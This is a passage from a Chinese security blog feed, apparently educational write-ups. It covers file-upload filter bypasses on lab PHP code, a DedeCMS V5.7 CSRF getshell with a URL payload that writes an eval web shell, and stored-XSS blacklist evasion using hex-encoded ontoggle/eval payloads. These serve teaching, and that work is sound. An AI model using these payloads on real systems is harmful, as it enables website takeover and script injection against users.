class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&apos;submit&apos;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">        $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);</span><br><span class="line">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">        $file_ext = strrchr($file_name, &apos;.&apos;);</span><br><span class="line">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">        $file_ext = trim($file_ext); //首尾去空</span><br><span class="line">        </span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;], $UPLOAD_ADDR . &apos;/&apos; . $_FILES[&apos;upload_file&apos;][&apos;name&apos;])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . &apos;/&apos; . $file_name;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &apos;此文件不允许上传&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . &apos;文件夹不存在,请手工创建！&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="方法：-4"><a href="#方法：-4" class="headerlink" title="方法："></a>方法：</h3><p>写个a.png:2.asp上传时a.png::$DATA即可</p><h2 id="9，构造文件后缀绕过"><a href="#9，构造文件后缀绕过" class="headerlink" title="9，构造文件后缀绕过"></a>9，构造文件后缀绕过</h2><h3 id="附上源码：-8"><a href="#附上源码：-8" class="headerlink" title="附上源码："></a>附上源码：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&apos;submit&apos;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">        $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);</span><br><span class="line">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">        $file_ext = strrchr($file_name, &apos;.&apos;);</span><br><span class="line">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">        $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //首尾去空</span><br><span class="line">        </span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;], $UPLOAD_ADDR . &apos;/&apos; . $_FILES[&apos;upload_file&apos;][&apos;name&apos;])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . &apos;/&apos; . $file_name;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &apos;此文件不允许上传&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . &apos;文件夹不存在,请手工创建！&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="方法：-5"><a href="#方法：-5" class="headerlink" title="方法："></a>方法：</h3><p>抓包改成”a.php. .”</p><h2 id="10，双写文件后缀绕过"><a href="#10，双写文件后缀绕过" class="headerlink" title="10，双写文件后缀绕过"></a>10，双写文件后缀绕过</h2><h3 id="附上源码：-9"><a href="#附上源码：-9" class="headerlink" title="附上源码："></a>附上源码：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = str_ireplace($deny_ext,<span class="string">""</span>, $file_name);</span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name)) &#123;</span><br><span class="line">            $img_path = $UPLOAD_ADDR . <span class="string">'/'</span> .$file_name;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="方法：-6"><a href="#方法：-6" class="headerlink" title="方法："></a>方法：</h3><p>抓包改成a.pphphp即可</p></excerpt>]]></content>
      
      
      
        <tags>
            
            <tag> 天气真好 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF</title>
      <link href="/2019/05/08/CSRF/"/>
      <url>/2019/05/08/CSRF/</url>
      
        <content type="html"><![CDATA[<excerpt in index> <ul><li><a id="more"></a><the rest of contents文></the></li></ul><h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h2 id="百度解释："><a href="#百度解释：" class="headerlink" title="百度解释："></a><strong><a href="https://baike.baidu.com/item/CSRF/2735433?fr=aladdin" target="_blank" rel="noopener">百度解释</a>：</strong></h2><p>CSRF（Cross-site request forgery）跨站请求伪造，也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本（<a href="https://baike.baidu.com/item/XSS" target="_blank" rel="noopener">XSS</a>），但它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装成受信任用户的请求来利用受信任的网站。与<a href="https://baike.baidu.com/item/XSS" target="_blank" rel="noopener">XSS</a>攻击相比，CSRF攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比<a href="https://baike.baidu.com/item/XSS" target="_blank" rel="noopener">XSS</a>更具危险性。</p><p><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/csrf01.jpg" alt="躲起来了"></p><hr><h2 id="本地测试"><a href="#本地测试" class="headerlink" title="本地测试"></a><strong>本地测试</strong></h2><p><strong>通过Dedecms V5.7后台的一处getshell来演示一次CSRF</strong></p><p><strong>漏洞代码在:/dede/sys_verifies.php  代码如下：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">else if ($action == &apos;getfiles&apos;)</span><br><span class="line">&#123;</span><br><span class="line">    if(!isset($refiles))</span><br><span class="line">    &#123;</span><br><span class="line">        ShowMsg(&quot;你没进行任何操作！&quot;,&quot;sys_verifies.php&quot;);</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    $cacheFiles = DEDEDATA.&apos;/modifytmp.inc&apos;;</span><br><span class="line">    $fp = fopen($cacheFiles, &apos;w&apos;);</span><br><span class="line">    fwrite($fp, &apos;&lt;&apos;.&apos;?php&apos;.&quot;\r\n&quot;);</span><br><span class="line">    fwrite($fp, &apos;$tmpdir = &quot;&apos;.$tmpdir.&apos;&quot;;&apos;.&quot;\r\n&quot;);</span><br><span class="line">    $dirs = array();</span><br><span class="line">    $i = -1;</span><br><span class="line">    $adminDir = preg_replace(&quot;#(.*)[\/\\\\]#&quot;, &quot;&quot;, dirname(__FILE__));</span><br><span class="line">    foreach($refiles as $filename)</span><br><span class="line">    &#123;</span><br><span class="line">        $filename = substr($filename,3,strlen($filename)-3);</span><br><span class="line">        if(preg_match(&quot;#^dede/#i&quot;, $filename)) </span><br><span class="line">        &#123;</span><br><span class="line">            $curdir = GetDirName( preg_replace(&quot;#^dede/#i&quot;, $adminDir.&apos;/&apos;, $filename) );</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $curdir = GetDirName($filename);</span><br><span class="line">        &#125;</span><br><span class="line">        if( !isset($dirs[$curdir]) ) </span><br><span class="line">        &#123;</span><br><span class="line">            $dirs[$curdir] = TestIsFileDir($curdir);</span><br><span class="line">        &#125;</span><br><span class="line">        $i++;</span><br><span class="line">        fwrite($fp, &apos;$files[&apos;.$i.&apos;] = &quot;&apos;.$filename.&apos;&quot;;&apos;.&quot;\r\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    fwrite($fp, &apos;$fileConut = &apos;.$i.&apos;;&apos;.&quot;\r\n&quot;);</span><br><span class="line">    fwrite($fp, &apos;?&apos;.&apos;&gt;&apos;);</span><br><span class="line">    fclose($fp);</span><br><span class="line"></span><br><span class="line">    $dirinfos = &apos;&apos;;</span><br><span class="line">    if($i &gt; -1)</span><br><span class="line">    &#123;</span><br><span class="line">        $dirinfos = &apos;&lt;tr bgcolor=&quot;#ffffff&quot;&gt;&lt;td colspan=&quot;2&quot;&gt;&apos;;</span><br><span class="line">        $dirinfos .= &quot;本次升级需要在下面文件夹写入更新文件，请注意文件夹是否有写入权限：&lt;br /&gt;\r\n&quot;;</span><br><span class="line">        foreach($dirs as $curdir)</span><br><span class="line">        &#123;</span><br><span class="line">            $dirinfos .= $curdir[&apos;name&apos;].&quot; 状态：&quot;.($curdir[&apos;writeable&apos;] ? &quot;[√正常]&quot; : &quot;&lt;font color=&apos;red&apos;&gt;[×不可写]&lt;/font&gt;&quot;).&quot;&lt;br /&gt;\r\n&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        $dirinfos .= &quot;&lt;/td&gt;&lt;/tr&gt;\r\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $doneStr = &quot;&lt;iframe name=&apos;stafrm&apos; src=&apos;sys_verifies.php?action=down&amp;curfile=0&apos; frameborder=&apos;0&apos; id=&apos;stafrm&apos; width=&apos;100%&apos; height=&apos;100%&apos;&gt;&lt;/iframe&gt;\r\n&quot;;</span><br><span class="line"></span><br><span class="line">    include(DEDEADMIN.&apos;/templets/sys_verifies_getfiles.htm&apos;);</span><br><span class="line"></span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>从这段代码里，可以得知会在/data目录下生成一个inc文件，并且这个inc文件的内容是我们可以控制的，因此只需要再找一个include了这个inc文件的地方，便可以完成攻击。</strong></p><p><strong>全局搜索了下这个文件，发现就在同一个php文件的下面，因此利用条件就全部齐了，可以开始构造写入的语句了。</strong></p><p><strong>观察逻辑，代码会先从url中获取一个refiles参数，并且refiles作为数组参数，被写入inc文件。而紧接的foreach语句其实重点就只是一个replace，只要绕过去就好了。最后的payload大概如下：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/cms/uploads/dede/sys_verifies.php?action=getfiles&amp;refiles[0]=123&amp;refiles[1]=\%22;eval($_GET[a]);die();//</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/csrf02.png" alt="躲起来了"></p><p><strong>此时写入shell成功，触发shell:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/cms/uploads/dede/sys_verifies.php?action=down&amp;a=phpinfo();</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/csrf03.png" alt="躲起来了"></p></excerpt>]]></content>
      
      
      
        <tags>
            
            <tag> 天气不错，就是眼睛睁不开 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dom Based XSS</title>
      <link href="/2019/04/02/Dom-Based-XSS/"/>
      <url>/2019/04/02/Dom-Based-XSS/</url>
      
        <content type="html"><![CDATA[<excerpt in index> <ul><li><a id="more"></a><the rest of contents文></the></li></ul><h2 id="DOM—hased-XSS漏洞的产生"><a href="#DOM—hased-XSS漏洞的产生" class="headerlink" title="DOM—hased XSS漏洞的产生**"></a>DOM—hased XSS漏洞的产生**</h2><p><strong>DOM—based XSS漏洞是基于文档对象模型Document Objeet Model，DOM)的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些是用户可以操纵的，如uRI ，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM—based XSS漏洞。</strong></p></excerpt>]]></content>
      
      
      
        <tags>
            
            <tag> 漫步 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>储存型XSS</title>
      <link href="/2019/04/01/%E5%82%A8%E5%AD%98%E5%9E%8BXSS/"/>
      <url>/2019/04/01/%E5%82%A8%E5%AD%98%E5%9E%8BXSS/</url>
      
        <content type="html"><![CDATA[<excerpt in index> <ul><li><a id="more"></a><the rest of contents文></the></li></ul><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS**"></a>存储型XSS**</h3><p><strong>存储型XSS，也叫持久型XSS，主要是将XSS代码发送到服务器（不管是数据库、内存还是文件系统等。），然后在下次请求页面的时候就不用带上XSS代码了。</strong></p><p><strong>最典型的就是留言板XSS。用户提交了一条包含XSS代码的留言到数据库。当目标用户查询留言时，那些留言的内容会从服务器解析之后加载出来。浏览器发现有XSS代码，就当做正常的HTML和JS解析执行。XSS攻击就发生了。</strong></p><hr><p>案例</p><p>在文章发表处和评论处都尝试插入XSS代码，但根据结果来看，程序把输出的内容都实体化了，插入的XSS代码没起效果。但是发现网站还有一个很不起眼的功能——私信，于是，开始给我注册的另一个帐号发送一条私信，私信中插入XSS代码，内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">“&gt;&lt;script&gt;alert(“1”)&lt;/script&gt;&lt;”</span><br></pre></td></tr></table></figure><p>结果如图</p><p><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/xss07.png" alt="哎呀，丢失图片了"></p><p>证明有戏，程序没有把私信的内容实体化</p><p>查看源代码</p><p><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/xss02.png" alt="哎呀，丢失图片了"></p><p>过滤了&lt;script.&gt;标签</p><p>说明程序有过滤XSS脚本</p><p>这时我们来看看过滤XSS的脚本(/system/util/Filter.php)：</p><p><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/xss03.png" alt="哎呀，丢失图片了"></p><p>因源代码较多，这里就不全部发了，这里发比较重要的几段：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ra1 =Array(&apos;javascript&apos;,&apos;vbscript&apos;,&apos;expression&apos;,&apos;applet&apos;,&apos;meta&apos;,&apos;xml&apos;,&apos;blink&apos;,&apos;link&apos;,&apos;script&apos;,&apos;embed&apos;,&apos;object&apos;,&apos;iframe&apos;,&apos;frame&apos;,&apos;frameset&apos;,&apos;ilayer&apos;,&apos;layer&apos;,&apos;bgsound&apos;,&apos;base&apos;,&apos;style&apos;);</span><br><span class="line">$ra2 =Array(&apos;onabort&apos;,&apos;onactivate&apos;,&apos;onafterprint&apos;,&apos;onafterupdate&apos;,&apos;onbeforeactivate&apos;,&apos;onbeforecopy&apos;,&apos;onbeforecut&apos;,&apos;onbeforedeactivate&apos;,&apos;onbeforeeditfocus&apos;,&apos;onbeforepaste&apos;,&apos;onbeforeprint&apos;,&apos;onbeforeunload&apos;,&apos;onbeforeupdate&apos;,&apos;onblur&apos;,&apos;onbounce&apos;,&apos;oncellchange&apos;,&apos;onchange&apos;,&apos;onclick&apos;,&apos;oncontextmenu&apos;,&apos;oncontrolselect&apos;,&apos;oncopy&apos;,&apos;oncut&apos;,&apos;ondataavailable&apos;,&apos;ondatasetchanged&apos;,&apos;ondatasetcomplete&apos;,&apos;ondblclick&apos;,&apos;ondeactivate&apos;,&apos;ondrag&apos;,&apos;ondragend&apos;,&apos;ondragenter&apos;,&apos;ondragleave&apos;,&apos;ondragover&apos;,&apos;ondragstart&apos;,&apos;ondrop&apos;,&apos;onerror&apos;,&apos;onerrorupdate&apos;,&apos;onfilterchange&apos;,&apos;onfinish&apos;,&apos;onfocus&apos;,&apos;onfocusin&apos;,&apos;onfocusout&apos;,&apos;onhelp&apos;,&apos;onkeydown&apos;,&apos;onkeypress&apos;,&apos;onkeyup&apos;,&apos;onlayoutcomplete&apos;,&apos;onload&apos;,&apos;onlosecapture&apos;,&apos;onmousedown&apos;,&apos;onmouseenter&apos;,&apos;onmouseleave&apos;,&apos;onmousemove&apos;,&apos;onmouseout&apos;,&apos;onmouseover&apos;,&apos;onmouseup&apos;,&apos;onmousewheel&apos;,&apos;onmove&apos;,&apos;onmoveend&apos;,&apos;onmovestart&apos;,&apos;onpaste&apos;,&apos;onpropertychange&apos;,&apos;onreadystatechange&apos;,&apos;onreset&apos;,&apos;onresize&apos;,&apos;onresizeend&apos;,&apos;onresizestart&apos;,&apos;onrowenter&apos;,&apos;onrowexit&apos;,&apos;onrowsdelete&apos;,&apos;onrowsinserted&apos;,&apos;onscroll&apos;,&apos;onselect&apos;,&apos;onselectionchange&apos;,&apos;onselectstart&apos;,&apos;onstart&apos;,&apos;onstop&apos;,&apos;onsubmit&apos;,&apos;onunload&apos;);</span><br></pre></td></tr></table></figure><p>我们可以看到，很多标签和事件都被过滤了</p><p>但是，黑名单肯定都存在绕过的可能</p><p>也许你已经注意到了，脚本并没有过滤eval函数和ontoggle事件</p><p>所以我们可以构造如下XSS代码</p><ol><li>“&gt;&lt;details open ontoggle=eval(“javascript:alert(‘xss’)”)&gt;&lt;”</li></ol><p>重新发一条私信过去试试</p><p>结果如图</p><p><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/xss04.png" alt="哎呀，丢失图片了"></p><p>查看页面源代码</p><p><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/xss05.png" alt="哎呀，丢失图片了"></p><p>过滤了javascript函数</p><p>既然这样，我们试一下通过ASCII 16进制编码转换来绕过过滤</p><p>将javascript转换编码后，构造出如下XSS代码</p><ol><li>“&gt;&lt;details open ontoggle=eval(“\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(‘xss’)”)&gt;&lt;”</li></ol><p>结果如图</p><p><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/xss06.png" alt="哎呀，丢失图片了"></p><p>成功弹出提示框</p></excerpt>]]></content>
      
      
      
        <tags>
            
            <tag> 春困 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS的原理分析与解剖</title>
      <link href="/2019/03/28/XSS%E7%9A%84%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E5%89%96/"/>
      <url>/2019/03/28/XSS%E7%9A%84%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E5%89%96/</url>
      
        <content type="html"><![CDATA[<excerpt in index> <ul><li><a id="more"></a><the rest of contents文></the></li></ul><h2 id="浏览器的结构"><a href="#浏览器的结构" class="headerlink" title="浏览器的结构**"></a>浏览器的结构**</h2><p>浏览器的主要组件，包含用户界面、浏览器引擎、呈现引擎、网络、用户界面后端、JavaScript解释器、数据存储。这里我们主要需要了解呈现引擎，其主要负责显示请求内容，如果请求的内容是HTML，它就负责解析HTML和CSS内容，并将解析后的内容显示在屏幕上。</p><p><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/xss01.png" alt="看我干啥"></p><p>值得注意的是，Chrome浏览器的每个标签页都分别对应一个呈现引擎实例，每个标签页都是独立的进程。</p><p>呈现引擎一开始会从网络层获取请求文档的内容，内容的大小一般限制在 8000 个块以内。</p><p>呈现引擎解析HTML文档，将标记转换成内容树上的DOM节点，将CSS元素样式转换成另外的树结构：呈现树。构建完成后，进入布局阶段，每个节点都会分配一个应该出现在屏幕上的坐标，由用户界面后端层将每个节点绘制出来。</p><p>解析的过程其实就是编译原理那一套东西，由解析器和词法分析器将文档内容构造成一个有效的解析树，最后由翻译器，将解析树翻译成浏览器可执行的机器指令，最后我们看到的就是一个可视化的web页面。</p><p>HTML解析器的任务是将HTML标记解析成解析树，常规解析器是不适用与HTML的，因为我们知道HTML具有很强的容错性，并不是与上下文无关的语法，我们会通过document.write添加额外的标记。HTML的定义采用了DTD格式，包括允许使用的元素及其属性和层次结构。HTML的解析是浏览器通过标记化、树结构的形式完成解析构建的。</p><p><strong>处理脚本和样式表的顺序</strong></p><p>HTML–&gt;CSS–&gt;–&gt;JavaScript 针对这个顺序我是报迟疑态度的，因为上述我们也提到过，在遇到&lt;<strong>script</strong>&gt;脚本时会立即解析并执行脚本，文档解析将停止，直到脚本执行完毕。如果脚本是外部的，解析过程会停止，直到从网络同步抓取资源完成后再继续。在HTML5中增加了一个选项，可将脚本标记为异步，以便由其它线程解析和执行。</p><h2 id="浏览器解码过程"><a href="#浏览器解码过程" class="headerlink" title="浏览器解码过程"></a><strong>浏览器解码过程</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;$&#123;content&#125;&lt;/p&gt;</span><br></pre></td></tr></table></figure><p>如上述代码所示，在P标签中存在一个输出变量${content}，浏览器解析的过程，首先是HTML解析，解析到P标签时，解析Content的内容，然后将其在页面显示出来。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;&lt;script&gt;alert(&quot;实体XSS&quot;);&lt;/script&gt;&lt;/p&gt;</span><br></pre></td></tr></table></figure><p>如果我们把Content的内容换成上面内容，即script脚本，那么浏览器解析的时候，当解析到P标签时，发现里面的内容存在script标签，便会把其当做JavaScript脚本进行解析，从而达到XSS攻击的目的。</p><p>所以针对此类HTML实体间的输出，我们希望输出的是HTML文本内容，而不是HTML标签、JS代码等，所以我们在输出时，需要对Content进行HTML编码,可使用OWASP ESAPI的ESAPI.encoder().encodeForHTML()。 HTML编码一般将如下几个字符进行编码替换：</p><p>\1. &amp; —&gt; &amp;</p><p>\2. &lt; —&gt; &lt;</p><p>\3. &gt; —&gt; &gt;</p><p>\4. “ —&gt; &quot;</p><p>\5. ‘ —&gt; &#x27;</p><p>\6. / —&gt; &#x2F;</p><p>在编码的字符中，其中&amp;、&lt;、&gt;、”、’ 五个字符是XML中定义的实体，所以我们需要对其进行编码，因为HTML也算作XML的一种，/ 字符作为HTML标签的结束协助符，避免破坏标签。</p><p><strong>HTML编码的作用就是将原本能被HTML解析成标签的东西，转换成字符串文本，以文本的形式展现</strong></p><h4 id="支持协议解析的HTML属性"><a href="#支持协议解析的HTML属性" class="headerlink" title="支持协议解析的HTML属性"></a>支持协议解析的HTML属性</h4><p>在HTML中H存在许多支持协议解析的HTML属性，如onclick，onerror，href，src等，类似这种属性是无法通过HTML编码防范XSS攻击，因为浏览器会先解析HTML编码的字符，将其转换为该属性的值，但是该属性本身支持JS代码执行，所以浏览器在HTML解码后，对该属性的值进行JS解析，故会执行相应的代码。</p><p><strong>如</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;img scr=1 onerror=alert(&apos;xss&apos;)&gt;  当找不到图片名为1的文件时，执行alert(&apos;xss&apos;)  </span><br><span class="line">&lt;a href=javascrip:alert(&apos;xss&apos;)&gt;s&lt;/a&gt;  点击s时运行alert(&apos;xss&apos;)  </span><br><span class="line">&lt;iframe 